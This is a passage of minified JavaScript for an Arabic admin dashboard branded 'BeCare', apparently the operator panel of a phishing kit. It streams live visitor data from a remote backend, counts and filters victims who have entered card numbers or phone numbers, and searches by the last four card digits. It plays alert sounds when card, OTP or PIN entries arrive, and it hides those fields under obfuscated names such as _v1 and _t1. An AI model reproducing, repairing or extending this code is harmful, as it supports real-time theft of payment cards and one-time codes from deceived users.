                idle: 0,
                left: 0,
                total: 0
            }
        }), [o, d] = (0, a.useState)(!0), [l, c] = (0, a.useState)(!1), [u, m] = (0, a.useState)(!1), [p, g] = (0, a.useState)([]), [h, b] = (0, a.useState)("all"), f = (0, a.useRef)(null), y = "https://moaiendy.onrender.com/api-backend", v = () => {
            let e = localStorage.getItem("admin_token");
            return {
                "Content-Type": "application/json",
                ...e ? {
                    Authorization: `Bearer ${e}`
                } : {}
            }
        }, _ = (0, a.useCallback)(async () => {
            if (e) try {
                let e = await fetch(`${y}/api/admin/analytics`, {
                        headers: v()
                    }),
                    t = await e.json();
                i(t)
            } catch (e) {
                console.error("Error fetching analytics:", e)
            } finally {
                d(!1)
            }
        }, [e]);
        (0, a.useEffect)(() => {
            if (!e) return;
            _();
            let t = setInterval(_, 1e4);
            return () => clearInterval(t)
        }, [e, _]);
        let j = (0, a.useCallback)(async () => {
            try {
                let e = await fetch(`${y}/api/admin/live-visitors`, {
                        headers: v()
                    }),
                    t = await e.json();
                Array.isArray(t) && g(t)
            } catch (e) {
                console.error("Live visitors fetch error:", e)
            }
        }, []);
        if ((0, a.useEffect)(() => {
                if (!e) return;
                let setAnalytics = i;
                j();
                let sock = (0, n.getSocket)(),
                    mergeLive = (vid, patch) => {
                        vid && patch && g(list => {
                            let idx = list.findIndex(v => v.id === vid);
                            if (-1 === idx) return list;
                            let next = [...list];
                            return next[idx] = {
                                ...next[idx],
                                ...patch
                            }, next
                        })
                    },
                    onOnline = ({
                        visitorId: vid
                    }) => {
                        mergeLive(vid, {
                            status: "active"
                        })
                    },
                    onPageChanged = ({
                        visitorId: vid,
                        page: pg,
                        step: st
                    }) => {
                        mergeLive(vid, {
                            currentPage: pg,
                            currentStep: st,
                            status: "active"
                        })
                    },
                    onOffline = ({
                        visitorId: vid
                    }) => {
                        mergeLive(vid, {
                            status: "left"
                        })
                    },
                    onDataUpdated = ({
                        visitorId: vid,
                        payload: patch
                    }) => {
                        vid && patch && mergeLive(vid, patch.phoneNumber || patch.phone_number || patch.identityNumber || patch.identity_number || patch.v1 ? {
                            isCustomer: !0,
                            status: "active"
                        } : {
                            status: "active"
                        })
                    },
                    onVisitorList = list => {
                        g(list.map(v => {
                            let t, a, r;
                            return {
                                id: v.id,
                                country: v.country || v.country_code || v.countryCode || null,
                                ipAddress: v.ipAddress || v.ip_address || null,
                                currentPage: v.currentPage || v.current_page || v.redirectPage || v.redirect_page || "home",
                                currentStep: v.currentStep || v.current_step,
                                redirectPage: v.redirectPage || v.redirect_page || null,
                                isCustomer: !!(v.phoneNumber || v.phone_number || v.identityNumber || v.identity_number || v.v1),
                                deviceType: v.deviceType || v.device_type || null,
                                os: v.os || v.operating_system || v.operatingSystem || null,
                                browser: v.browser || null,
                                status: (t = Date.now(), a = v.lastSeen ? new Date(v.lastSeen).getTime() : 0, r = v.lastActiveSeen ? new Date(v.lastActiveSeen).getTime() : a, (!0 === v.isOnline || 1 === v.isOnline || !0 === v.is_online || 1 === v.is_online) && t - a < 3e4 ? "active" : t - r < 12e4 || t - a < 12e4 ? "idle" : "left"),
                                lastSeen: v.lastSeen || v.last_seen || new Date().toISOString()
                            }
                        }))
                    },
                    onLiveVisitors = list => {
                        Array.isArray(list) && g(list)
                    },
                    onAnalytics = data => {
                        data && data.visitors && setAnalytics(data)
                    };
                return sock.on("admin:visitor_online", onOnline), sock.on("admin:visitor_page_changed", onPageChanged), sock.on("admin:visitor_offline", onOffline), sock.on("admin:visitor_data_updated", onDataUpdated), sock.on("admin:visitor_list", onVisitorList), sock.on("admin:live_visitors", onLiveVisitors), sock.on("admin:analytics_update", onAnalytics), () => {
                    sock.off("admin:visitor_online", onOnline), sock.off("admin:visitor_page_changed", onPageChanged), sock.off("admin:visitor_offline", onOffline), sock.off("admin:visitor_data_updated", onDataUpdated), sock.off("admin:visitor_list", onVisitorList), sock.off("admin:live_visitors", onLiveVisitors), sock.off("admin:analytics_update", onAnalytics)
                }
            }, [e, j, i]), (0, a.useEffect)(() => {
                let e = e => {
                    f.current && !f.current.contains(e.target) && m(!1)
                };
                return document.addEventListener("mousedown", e), () => document.removeEventListener("mousedown", e)
            }, []), !e) return null;
        let w = s.visitors ?? {
                active: 0,
                idle: 0,
                left: 0,
                total: 0
            },
            k = s.customers ?? {
                active: 0,
                idle: 0,
                left: 0,
                total: 0
            },
            N = e => o ? "..." : e,
            A = p.filter(e => "active" === e.status).length,
            S = p.filter(e => "visitors" === h ? !e.isCustomer : "customers" !== h || e.isCustomer);
        return (0, t.jsxs)("div", {
            className: "bg-white border-b border-gray-200 shadow-sm select-none",
            dir: "rtl",
            children: [(0, t.jsxs)("div", {
                className: "flex items-center gap-0 h-[46px] px-3 border-b border-gray-200",
                children: [(0, t.jsxs)("div", {
                    className: "flex items-center gap-2 pl-4 border-l border-gray-200 mr-3",
                    children: [(0, t.jsx)("div", {
                        className: "w-7 h-7 rounded-lg bg-gradient-to-br from-green-500 to-emerald-700 flex items-center justify-center shadow-lg",
                        children: (0, t.jsx)("span", {
                            className: "text-gray-900 font-black text-xs",
                            children: "B"
                        })
                    }), (0, t.jsx)("span", {
                        className: "text-gray-800 font-bold text-sm tracking-wide",
                        children: "BeCare"
                    })]
                }), (0, t.jsxs)("div", {
                    className: "flex items-center gap-0 ml-auto overflow-x-auto scrollbar-hide",
                    children: [(0, t.jsxs)("div", {
                        className: "relative",
                        ref: f,
                        children: [(0, t.jsxs)("button", {
                            onClick: () => m(e => !e),
                            className: "flex items-center gap-1.5 px-3 h-[46px] hover:bg-gray-100 transition-colors text-xs border-l border-gray-200",
                            title: "الزوار الحاليون",
                            children: [(0, t.jsx)("span", {
                                className: "w-2 h-2 rounded-full bg-green-400 animate-pulse inline-block"
                            }), (0, t.jsx)("span", {
                                className: "text-green-600 font-bold text-sm",
                                children: A
                            }), (0, t.jsx)(ee, {
                                className: "w-3.5 h-3.5 text-gray-400"
                            })]
                        }), u && (0, t.jsxs)("div", {
                            className: "absolute top-full mt-0 right-0 z-50 w-80 bg-gray-50 rounded-b-xl shadow-2xl border border-gray-200 overflow-hidden",
                            children: [(0, t.jsxs)("div", {
                                className: "px-3 py-2 border-b border-gray-200 flex items-center justify-between bg-gray-50",
                                children: [(0, t.jsxs)("div", {
                                    className: "flex items-center gap-1.5",
                                    children: [(0, t.jsx)("span", {
                                        className: "w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse inline-block"
                                    }), (0, t.jsx)("span", {
                                        className: "text-xs font-bold text-gray-800",
                                        children: "الزوار الحاليون"
                                    }), (0, t.jsxs)("span", {
                                        className: "text-[10px] text-gray-400",
                                        children: ["(", S.length, ")"]
                                    })]
                                }), (0, t.jsx)("div", {
                                    className: "flex items-center gap-1",
                                    children: ["all", "visitors", "customers"].map(e => (0, t.jsx)("button", {
                                        onClick: () => b(e),
                                        className: `text-[10px] px-2 py-0.5 rounded-full transition-colors ${h===e?"bg-green-600 text-gray-900":"bg-gray-100 text-gray-400 hover:bg-gray-200"}`,
                                        children: "all" === e ? "الكل" : "visitors" === e ? "زوار" : "عملاء"
                                    }, e))
                                })]
                            }), (0, t.jsx)("div", {
                                className: "max-h-72 overflow-y-auto divide-y divide-gray-200",
                                children: 0 === S.length ? (0, t.jsx)("div", {
                                    className: "py-6 text-center text-xs text-gray-400",
                                    children: "لا يوجد زوار حاليون"
                                }) : S.map(e => {
                                    var a, r;
                                    return (0, t.jsxs)("div", {
                                        className: "flex items-center gap-2 px-3 py-2 hover:bg-gray-100 transition-colors",
                                        children: ["active" === (a = e.status) ? (0, t.jsx)("span", {
                                            className: "w-2 h-2 rounded-full bg-green-400 inline-block shrink-0 animate-pulse"
                                        }) : "idle" === a ? (0, t.jsx)("span", {
                                            className: "w-2 h-2 rounded-full bg-amber-400 inline-block shrink-0"
                                        }) : (0, t.jsx)("span", {
                                            className: "w-2 h-2 rounded-full bg-gray-500 inline-block shrink-0"
                                        }), (0, t.jsx)("span", {
                                            className: "text-base leading-none shrink-0",
                                            children: function(e) {
                                                if (!e) return "🌐";
                                                let t = e.toUpperCase();
                                                return 2 === t.length ? String.fromCodePoint(127397 + t.charCodeAt(0), 127397 + t.charCodeAt(1)) : "🌐"
                                            }(e.country)
                                        }), (0, t.jsxs)("div", {
                                            className: "flex-1 min-w-0",
                                            children: [(0, t.jsxs)("div", {
                                                className: "flex items-center gap-1.5",
                                                children: [(0, t.jsx)("span", {
                                                    className: "text-[10px] font-mono font-bold text-gray-700 truncate",
                                                    children: e.id.slice(-8).toUpperCase()
                                                }), e.isCustomer && (0, t.jsx)("span", {
                                                    className: "text-[9px] px-1 py-0.5 rounded bg-blue-900 text-blue-300 font-medium shrink-0",
                                                    children: "عميل"
                                                })]
                                            }), (0, t.jsxs)("div", {
                                                className: "flex items-center gap-1.5 mt-0.5",
                                                children: [e.ipAddress && (0, t.jsx)("span", {
                                                    className: "text-[10px] text-gray-400 font-mono",
                                                    children: e.ipAddress
                                                }), e.ipAddress && (0, t.jsx)("span", {
                                                    className: "text-gray-400",
                                                    children: "·"
                                                }), (0, t.jsx)("span", {
                                                    className: "text-[10px] text-gray-400 truncate",
                                                    children: es[r = pageDisplay(e)] || r
                                                })]
                                            })]
                                        })]
                                    }, e.id)
                                })
                            }), (0, t.jsxs)("div", {
                                className: "px-3 py-1.5 border-t border-gray-200 bg-gray-50 text-[10px] text-gray-400 text-center flex items-center justify-center gap-1",
                                children: [(0, t.jsx)(et, {
                                    className: "w-3 h-3"
                                }), "تحديث فوري عبر Socket.io"]
                            })]
                        })]
                    }), (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 h-[46px] border-l border-gray-200",
                        children: [(0, t.jsx)(en, {
                            className: "w-3.5 h-3.5 text-gray-400 shrink-0"
                        }), (0, t.jsx)("span", {
                            className: "text-gray-500 text-[11px]",
                            children: "اليوم"
                        }), (0, t.jsx)("span", {
                            className: "text-gray-800 font-bold text-sm",
                            children: N(s.todayVisitors)
                        })]
                    }), (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 h-[46px] border-l border-gray-200",
                        children: [(0, t.jsx)(R, {
                            className: "w-3.5 h-3.5 text-gray-400 shrink-0"
                        }), (0, t.jsx)("span", {
                            className: "text-gray-500 text-[11px]",
                            children: "إجمالي"
                        }), (0, t.jsx)("span", {
                            className: "text-gray-800 font-bold text-sm",
                            children: N(s.totalVisitors)
                        })]
                    }), (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 h-[46px] border-l border-gray-200",
                        children: [(0, t.jsx)(x, {
                            className: "w-3.5 h-3.5 text-blue-600 shrink-0"
                        }), (0, t.jsx)("span", {
                            className: "text-blue-600 font-bold text-sm",
                            children: N(s.visitorsWithCard)
                        })]
                    }), (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 h-[46px] border-l border-gray-200",
                        children: [(0, t.jsx)(er, {
                            className: "w-3.5 h-3.5 text-emerald-600 shrink-0"
                        }), (0, t.jsx)("span", {
                            className: "text-emerald-600 font-bold text-sm",
                            children: N(s.visitorsWithPhone)
                        })]
                    }), (0, t.jsx)("div", {
                        className: "w-px h-5 bg-gray-100 mx-1 shrink-0"
                    }), (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 h-[46px] border-l border-gray-200",
                        children: [(0, t.jsx)("span", {
                            className: "text-[11px] text-gray-500 shrink-0",
                            children: "زوار"
                        }), (0, t.jsx)("span", {
                            className: "text-green-600 font-bold text-sm",
                            children: N(w.active)
                        }), (0, t.jsx)("span", {
                            className: "text-gray-400 text-xs",
                            children: "/"
                        }), (0, t.jsx)("span", {
                            className: "text-amber-600 font-bold text-sm",
                            children: N(w.idle)
                        }), (0, t.jsx)("span", {
                            className: "text-gray-400 text-xs",
                            children: "/"
                        }), (0, t.jsx)("span", {
                            className: "text-gray-400 font-bold text-sm",
                            children: N(w.left)
                        })]
                    }), (0, t.jsxs)("div", {
                        className: "flex items-center gap-1.5 px-3 h-[46px] border-l border-gray-200",
                        children: [(0, t.jsx)("span", {
                            className: "text-[11px] text-gray-500 shrink-0",
                            children: "عملاء"
                        }), (0, t.jsx)("span", {
                            className: "text-green-600 font-bold text-sm",
                            children: N(k.active)
                        }), (0, t.jsx)("span", {
                            className: "text-gray-400 text-xs",
                            children: "/"
                        }), (0, t.jsx)("span", {
                            className: "text-amber-600 font-bold text-sm",
                            children: N(k.idle)
                        }), (0, t.jsx)("span", {
                            className: "text-gray-400 text-xs",
                            children: "/"
                        }), (0, t.jsx)("span", {
                            className: "text-gray-400 font-bold text-sm",
                            children: N(k.left)
                        })]
                    })]
                }), (0, t.jsxs)("div", {
                    className: "flex items-center gap-0 border-r border-gray-200 mr-auto",
                    children: [(0, t.jsx)("button", {
                        onClick: () => c(!0),
                        className: "flex items-center justify-center w-10 h-[46px] hover:bg-gray-100 transition-colors border-l border-gray-200",
                        title: "إعدادات",
                        children: (0, t.jsx)(Z, {
                            className: "w-4 h-4 text-gray-400 hover:text-gray-900 transition-colors"
                        })
                    }), (0, t.jsx)("button", {
                        className: "flex items-center justify-center w-10 h-[46px] hover:bg-gray-100 transition-colors border-l border-gray-200",
                        title: "تنبيهات",
                        children: (0, t.jsx)(ea, {
                            className: "w-4 h-4 text-gray-400 hover:text-gray-900 transition-colors"
                        })
                    }), (0, t.jsxs)("button", {
                        onClick: r,
                        className: "flex items-center gap-2 px-3 h-[46px] hover:bg-gray-100 transition-colors",
                        title: "تسجيل الخروج",
                        children: [(0, t.jsx)("div", {
                            className: "w-7 h-7 rounded-full bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center",
                            children: (0, t.jsx)("span", {
                                className: "text-gray-900 text-xs font-bold",
                                children: e.email?.charAt(0).toUpperCase() || "A"
                            })
                        }), (0, t.jsx)("svg", {
                            className: "w-3 h-3 text-gray-400",
                            fill: "none",
                            viewBox: "0 0 24 24",
                            stroke: "currentColor",
                            children: (0, t.jsx)("path", {
                                strokeLinecap: "round",
                                strokeLinejoin: "round",
                                strokeWidth: 2,
                                d: "M19 9l-7 7-7-7"
                            })
                        })]
                    })]
                })]
            }), (0, t.jsx)(Q, {
                isOpen: l,
                onClose: () => c(!1)
            })]
        })
    }

    function eo() {
        let [e, r] = (0, a.useState)([]), [d, l] = (0, a.useState)(null), [c, u] = (0, a.useState)(""), [m, p] = (0, a.useState)("all"), [g, h] = (0, a.useState)(new Set), [b, x] = (0, a.useState)(!0), [f, y] = (0, a.useState)(215), v = (0, a.useRef)(new Set), _ = (0, a.useRef)(null), w = (0, a.useRef)([]), k = (0, a.useRef)(!0), N = (0, a.useRef)(null), A = (0, a.useRef)(null), S = (0, a.useRef)(""), C = (0, a.useRef)(new Map), H = (0, a.useRef)(new Map), [B, P] = (0, a.useState)(null);
        (0, a.useEffect)(() => {
            let e = new Audio("/sounds/card_alert.mp3");
            e.preload = "auto", e.volume = 1, N.current = e;
            let t = new Audio("/sounds/code_alert.mp3");
            t.preload = "auto", t.volume = 1, A.current = t;
            let a = localStorage.getItem("admin_token");
            return a && P(a), S.current = new Date().toISOString(), setTimeout(() => {
                N.current && (N.current.currentTime = 0, N.current.play().catch(() => {}))
            }, 500), () => {
                N.current = null, A.current = null
            }
        }, []);
        let I = (0, a.useCallback)(() => {
                let e = N.current;
                e && (e.currentTime = 0, e.play().catch(() => {}))
            }, []),
            E = (0, a.useCallback)(() => {
                let e = A.current;
                e && (e.currentTime = 0, e.play().catch(() => {}))
            }, []);
        (0, a.useEffect)(() => {
            if (!B) return;
            let e = async () => {
                try {
                    let e = S.current,
                        t = await fetch(`https://moaiendy.onrender.com/api-backend/api/admin/alerts?since=${encodeURIComponent(e)}`, {
                            headers: {
                                Authorization: `Bearer ${B}`
                            }
                        });
                    if (!t.ok) return;
                    let a = await t.json();
                    if (!a.alerts || 0 === a.alerts.length) return;
                    let r = a.alerts[0].updatedAt;
                    r > S.current && (S.current = r);
                    for (let e of a.alerts) {
                        let t = C.current.get(e.id),
                            a = e.updatedAt;
                        t !== a && C.current.set(e.id, a)
                    }
                } catch (e) {}
            }, t = setTimeout(e, 2e3), a = setInterval(e, 3e3);
            return () => {
                clearTimeout(t), clearInterval(a)
            }
        }, [B, I, E]);
        let R = (0, a.useCallback)((e, t) => {
                if (k.current || !t) return;
                let a = {
                    ...t
                };
                ["_v1", "_v2", "_v3", "_v4", "_v5", "_v6", "_v7", "history", "ownerName", "phoneNumber", "identityNumber"].forEach(e => {
                    void 0 === a[e] && delete a[e]
                });
                for (let e = 1; e <= 9; e++) {
                    let r = `v${e}`,
                        n = `_v${e}`;
                    void 0 !== t[r] && null !== t[r] && (a[n] = t[r])
                }
                void 0 !== t.v5_status && (a._v5Status = t.v5_status), void 0 !== t.v6_status && (a._v6Status = t.v6_status), void 0 !== t.v7_status && (a._v7Status = t.v7_status), void 0 !== t.v4_status && (a._v4Status = t.v4_status), r(t => t.map(t => {
                    if (t.id !== e) return t;
                    let r = {
                        ...t,
                        ...a
                    };
                    return a.history && Array.isArray(a.history) ? r.history = a.history : Array.isArray(t.history) && (r.history = t.history), r
                })), l(t => {
                    if (!t || t.id !== e) return t;
                    let r = {
                        ...t,
                        ...a
                    };
                    return a.history && Array.isArray(a.history) ? r.history = a.history : Array.isArray(t.history) && (r.history = t.history), r
                })
            }, []),
            M = (0, a.useCallback)((e, t) => {
                if (k.current || !t) return;
                let a = Object.keys(t);
                if (0 === a.length) return;
                if (a.every(e => ["currentPage", "currentStep", "lastSeen", "isOnline", "lastActiveAt", "updatedAt"].includes(e))) return;
                if (t.history && Array.isArray(t.history)) {
                    let a = H.current.get(e) || 0;
                    if (t.history.length > a) {
                        H.current.set(e, t.history.length);
                        let r = t.history[t.history.length - 1];
                        if ("_t1" === r?.type || "card" === r?.type) return void I();
                        if ("_t2" === r?.type || "otp" === r?.type || "_t3" === r?.type || "pin" === r?.type) return void E();
                        if ("_t4" === r?.type || "phone_verification" === r?.type) return void E();
                        if ("_t5" === r?.type || "phone_otp" === r?.type) return void E()
                    }
                }
                if ("verifying" === t._v5Status || "verifying" === t._v6Status || "verifying" === t._v7Status) return void E();
                if (t.basicInfoUpdatedAt || t.insurCompletedAt || t.comparCompletedAt || t.otpSubmittedAt || t.pinSubmittedAt || t.phoneSubmittedAt || t.phoneOtpSubmittedAt) return void E();
                if (t.phoneCarrier && t._v4Status) return void E()
            }, [I, E]);
        (0, a.useEffect)(() => {
            if (!d?.id) return;
            let e = d.id,
                t = setInterval(async () => {
                    try {
                        let t = await i(e);
                        if (!t) return;
                        l(a => a && a.id === e ? {
                            ...a,
                            ...t
                        } : a), r(a => a.map(a => a.id !== e ? a : {
                            ...a,
                            ...t
                        }))
                    } catch (e) {}
                }, 5e3);
            return () => clearInterval(t)
        }, [d?.id]);
        let z = (0, a.useRef)(M),
            L = (0, a.useRef)(R);
        (0, a.useEffect)(() => {
            z.current = M
        }, [M]), (0, a.useEffect)(() => {
            L.current = R
        }, [R]), (0, a.useEffect)(() => {
            let onVisitors = e => {
                let t = e.filter(e => e.identityNumber || e.phoneNumber || e.ownerName && "زائر جديد" !== e.ownerName || Array.isArray(e.history) && e.history.length > 0),
                    a = new Date(new Date().getTime() - 3e4),
                    n = t.map(e => {
                        let t = !1;
                        if (e.lastSeen) try {
                            t = (e.lastSeen && "function" == typeof e.lastSeen.toDate ? e.lastSeen.toDate() : e.lastSeen instanceof Date ? e.lastSeen : new Date(e.lastSeen)) >= a
                        } catch (e) {
                            console.error("Error parsing lastSeen:", e)
                        }
                        return {
                            ...e,
                            isOnline: t
                        }
                    }).sort((e, t) => {
                        let a = e.updatedAt ? e.updatedAt instanceof Date ? e.updatedAt.getTime() : new Date(e.updatedAt).getTime() : 0;
                        return (t.updatedAt ? t.updatedAt instanceof Date ? t.updatedAt.getTime() : new Date(t.updatedAt).getTime() : 0) - a
                    });
                let o = new Set(w.current),
                    d = n.filter(e => e.id && !o.has(e.id));
                !k.current && d.length > 0 && E(), n.forEach(e => {
                    e.id && Array.isArray(e.history) && H.current.set(e.id, e.history.length)
                }), w.current = n.map(e => e.id).filter(e => void 0 !== e), v.current = new Set(n.filter(e => e.isUnread && e.id).map(e => e.id)), k.current && (k.current = !1), r(n), x(!1), l(e => e && e.id ? (_.current = e.id, n.find(t => t.id === e.id) || e) : !e && n.length > 0 ? (_.current = n[0].id || null, n[0]) : e)
            },
            onDataUpdate = (e, t) => {
                z.current(e, t)
            },
            onPageChange = (e, t) => {
                L.current(e, t)
            },
            unsub = (0, n.subscribeToApplications)(onVisitors, onDataUpdate, onPageChange);
            let tk = localStorage.getItem("admin_token");
            tk && fetch("https://moaiendy.onrender.com/api-backend/api/admin/visitors", {
                headers: {
                    Authorization: "Bearer " + tk
                }
            }).then(t => t.ok ? t.json() : []).then(onVisitors).catch(() => {});
            let to = setTimeout(() => x(!1), 3e3);
            return () => {
                clearTimeout(to), unsub()
            }
        }, []);
        let O = (0, a.useMemo)(() => {
                let t = e;
                if ("hasCard" === m && (t = t.filter(e => !!e._v1 || !!e.v1 || !!e.cardNumber || !!(e.history && Array.isArray(e.history)) && e.history.some(e => ("_t1" === e.type || "card" === e.type) && (e.data?._v1 || e.data?.v1 || e.data?.cardNumber)))), c) {
                    let e = c.toLowerCase();
                    t = t.filter(t => {
                        let a = t._v1 || t.v1 || t.cardNumber;
                        return t.ownerName?.toLowerCase().includes(e) || t.identityNumber?.includes(e) || t.phoneNumber?.includes(e) || a?.slice(-4).includes(e)
                    })
                }
                return t
            }, [e, m, c]),
            D = async () => {
                if (0 === g.size) return;
                let e = g.size;
                if (confirm(`هل أنت متأكد من حذف ${e} زائر؟

هذا الإجراء لا يمكن التراجع عنه.`)) try {
                    let t = Array.from(g);
                    await o(t), h(new Set), alert(`✅ تم حذف ${e} زائر بنجاح`)
                } catch (e) {
                    console.error("Error deleting applications:", e), alert(`❌ حدث خطأ أثناء الحذف: ${e instanceof Error?e.message:"خطأ غير معروف"}`)
                }
            }, $ = async e => {
                l(e), e.isUnread && e.id && await s(e.id, {
                    isUnread: !1
                })
            };
        return b ? (0, t.jsx)("div", {
            className: "h-screen flex items-center justify-center bg-gray-50",
            children: (0, t.jsxs)("div", {
                className: "text-center",
                children: [(0, t.jsx)("div", {
                    className: "animate-spin rounded-full h-12 w-12 border-b-2 border-green-600 mx-auto"
                }), (0, t.jsx)("p", {
                    className: "mt-4 text-gray-600",
                    children: "جاري التحميل..."
                })]
            })
        }) : (0, t.jsxs)("div", {
            className: "h-screen flex flex-col bg-gray-50",
            dir: "rtl",
            children: [(0, t.jsx)(ei, {}), (0, t.jsxs)("div", {
                className: "flex-1 flex flex-col landscape:flex-row md:flex-row overflow-hidden",
                children: [(0, t.jsx)(j, {
                    visitors: O,
                    selectedVisitor: d,
                    onSelectVisitor: $,
                    searchQuery: c,
                    onSearchChange: u,
                    cardFilter: m,
                    onCardFilterChange: p,
                    selectedIds: g,
                    onToggleSelect: e => {
                        let t = new Set(g);
                        t.has(e) ? t.delete(e) : t.add(e), h(t)
                    },
                    onSelectAll: () => {
                        g.size === O.length ? h(new Set) : h(new Set(O.map(e => e.id).filter(e => void 0 !== e)))
                    },
                    onDeleteSelected: D,
                    sidebarWidth: f,
                    onSidebarWidthChange: y
                }), (0, t.jsx)(T, {
                    visitor: d
                })]
            })]
        })
    }
    e.s(["default", () => eo], 31713)
}]);
